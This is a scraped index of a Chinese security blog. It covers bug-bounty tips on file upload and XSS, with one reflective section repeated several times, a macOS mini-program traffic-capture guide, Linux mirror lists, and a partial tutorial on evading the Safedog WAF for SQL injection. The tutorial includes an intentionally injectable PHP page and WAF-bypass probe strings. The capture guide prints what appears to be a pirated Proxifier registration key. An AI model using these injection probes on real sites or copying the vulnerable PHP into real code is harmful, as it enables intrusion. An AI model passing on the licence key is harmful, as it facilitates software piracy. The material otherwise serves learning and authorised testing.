任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#威胁情报的提交"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#对于挖掘高危严重级别漏洞的一些思考"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#1自动化信息收集的能力"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#2打漏洞组合拳的能力"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#3绕waf的能力"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#4细心和耐心和一些运气"},{"categories":["学习"],"content":" 对于挖掘高危、严重级别漏洞的一些思考因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。 1.自动化信息收集的能力这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。 2.打漏洞组合拳的能力SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。 3.绕waf的能力这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。 4.细心和耐心和一些运气心细挖天下，再加上一些运气，可能高危严重就到手了。 总结挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:4","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#总结"},{"categories":["技术"],"content":" 转载自： https://xz.aliyun.com/t/8501 ","date":"2022-10-22","objectID":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/:0:0","series":null,"tags":["抓包"],"title":"如何在mac上抓小程序的流量","uri":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/#"},{"categories":["技术"],"content":" 如何在mac上抓小程序的流量通过Proxifier工具代理微信小程序流量到Burp ","date":"2022-10-22","objectID":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/:1:0","series":null,"tags":["抓包"],"title":"如何在mac上抓小程序的流量","uri":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/#如何在mac上抓小程序的流量"},{"categories":["技术"],"content":" 安装Burpsuite证书到macOS系统中 ","date":"2022-10-22","objectID":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/:1:1","series":null,"tags":["抓包"],"title":"如何在mac上抓小程序的流量","uri":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/#安装burpsuite证书到macos系统中"},{"categories":["技术"],"content":" 安装proxifier并添加Proxifier规则 Your name or company name: macwk.com Your registration key: 2DNRX-V3PNK-TEGYN-DR01D-9UGGT brew install --cask proxifier ","date":"2022-10-22","objectID":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/:1:2","series":null,"tags":["抓包"],"title":"如何在mac上抓小程序的流量","uri":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/#安装proxifier并添加proxifier规则"},{"categories":["技术"],"content":" 添加代理和配置代理规则 微信小程序路径 : /Applications/WeChat.app/Contents/MacOS/Mini Program.app ⚠️ 先启动Proxifier，再启动Burpsuite，最后打开微信小程序,(最好关掉其他代理) ","date":"2022-10-22","objectID":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/:1:3","series":null,"tags":["抓包"],"title":"如何在mac上抓小程序的流量","uri":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/#添加代理和配置代理规则"},{"categories":["技术"],"content":" 抓包成功 ","date":"2022-10-22","objectID":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/:1:4","series":null,"tags":["抓包"],"title":"如何在mac上抓小程序的流量","uri":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/#抓包成功"},{"categories":["技术"],"content":" 存在其他代理(如clashX)时，Proxifier设置方法 ","date":"2022-10-22","objectID":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/:1:5","series":null,"tags":["抓包"],"title":"如何在mac上抓小程序的流量","uri":"/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/#存在其他代理如clashx时proxifier设置方法"},{"categories":["工具"],"content":" 打开配置文件 vim /etc/apt/sources.list ","date":"2021-03-21","objectID":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/:1:0","series":null,"tags":["Kali"],"title":"kali修改为国内源","uri":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/#打开配置文件"},{"categories":["工具"],"content":" kali源 #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #官方源 deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib ","date":"2021-03-21","objectID":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/:2:0","series":null,"tags":["Kali"],"title":"kali修改为国内源","uri":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/#kali源"},{"categories":["工具"],"content":" debian源 # 中科大源 deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free deb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free # 阿里云 deb http://mirrors.aliyun.com/debian/ buster main non-free contrib deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib deb http://mirrors.aliyun.com/debian-security buster/updates main #deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib #deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib #deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib #deb-src http://mirrors.aliyun.com/debian-security buster/updates main # 网易源 deb http://mirrors.163.com/debian/ buster main non-free contrib deb http://mirrors.163.com/debian/ buster-updates main non-free contrib deb http://mirrors.163.com/debian/ buster-backports main non-free contrib deb http://mirrors.163.com/debian-security/ buster/updates main non-free contrib #deb-src http://mirrors.163.com/debian/ buster main non-free contrib #deb-src http://mirrors.163.com/debian/ buster-updates main non-free contrib #deb-src http://mirrors.163.com/debian/ buster-backports main non-free contrib #deb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib # 官方源 deb http://deb.debian.org/debian buster main contrib non-free deb http://deb.debian.org/debian buster-updates main contrib non-free deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free #deb-src http://deb.debian.org/debian buster main contrib non-free #deb-src http://deb.debian.org/debian buster-updates main contrib non-free #deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free ","date":"2021-03-21","objectID":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/:3:0","series":null,"tags":["Kali"],"title":"kali修改为国内源","uri":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/#debian源"},{"categories":["工具"],"content":" 更新软件列表并更新软件 sudo apt update \u0026\u0026 sudo apt upgrade -y ","date":"2021-03-21","objectID":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/:4:0","series":null,"tags":["Kali"],"title":"kali修改为国内源","uri":"/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/#更新软件列表并更新软件"},{"categories":["学习"],"content":" 转载自： 网络 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#"},{"categories":["学习"],"content":" 攻击的特定:攻击二象性:已知攻击和未知攻击 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#攻击的特定"},{"categories":["学习"],"content":" 目前市面主流的WAF产品:","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#目前市面主流的waf产品"},{"categories":["学习"],"content":" 云WAF 阿里云盾 腾讯网站管家 创宇盾 ClodeFlare等 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:1:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#云waf"},{"categories":["学习"],"content":" 软件产品类 安全狗 云锁 360主机卫士 ModSecurity ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:2:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#软件产品类"},{"categories":["学习"],"content":" 硬件类型设备: 启明星辰 绿盟 天融信 飞塔等 硬件waf缺陷:对HTTP协议的兼容性不强,对异常报文会产生bug,导致绕过 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:3:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#硬件类型设备"},{"categories":["学习"],"content":" WAF的核心原理: 运用黑白思想 特征匹配,漏洞签名:特定特征的漏洞,比如stract2漏洞 对匹配结果进行响应(拦截,记录) ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#waf的核心原理"},{"categories":["学习"],"content":" WAF的几种部署模式:","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#waf的几种部署模式"},{"categories":["学习"],"content":" 基于DNS解析修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:1:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#基于dns解析"},{"categories":["学习"],"content":" 串联模式一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署. ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:2:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#串联模式"},{"categories":["学习"],"content":" 旁路模式利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断. ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:3:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#旁路模式"},{"categories":["学习"],"content":" 软件嵌入中间件+检测引擎模式在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:4:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#软件嵌入中间件检测引擎模式"},{"categories":["学习"],"content":" WAF为什么会被绕过: 鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作 WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性 硬件WAF自身往往存在漏洞 架构:waf部署模式 规则缺陷/特性 协议:指HTTP0.9协议:TCP长连接 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#waf为什么会被绕过"},{"categories":["学习"],"content":" WAF绕过实战—-绕过安全狗进行注入所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#waf绕过实战-绕过安全狗进行注入"},{"categories":["学习"],"content":" 实验环境:环境:安全狗Apache最新版 本地测试代码(PHP): $id = $_GET['id']; $con = mysql_connect(\"localhost\",\"root\",\"root\"); if (!$con){die('Could not connect: ' . mysql_error());} mysql_select_db(\"dvwa\", $con); $query = \"SELECT first_name,last_name FROM users WHERE user_id = '$id'; \"; $result = mysql_query($query)or die('\u003cpre\u003e'.mysql_error().'\u003c/pre\u003e'); while($row = mysql_fetch_array($result)) { echo $row['0'] . \"\u0026nbsp\" . $row['1']; echo \"\u003cbr /\u003e\";}echo \"\u003cbr/\u003e\";echo $query; mysql_close($con); ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:1:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#实验环境"},{"categories":["学习"],"content":" 绕过拦截and 1=1首先先稍微测试一番,发现存在安全狗 http://127.0.0.1/test.php?id=1 and 1=1%23 and 1 拦截 and '1' 拦截 and a 不拦截 and 'a' 拦截 and ! 不拦截 and 1+1 拦截 and 1+a 拦截 and hex(1) 不拦截 通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路 用其他字符替换 and 或者 or 带入的不是字符串和数字型，带入一个特殊符号 针对第一种我们可以去看看运算符号 随便找到几个| ^ xor 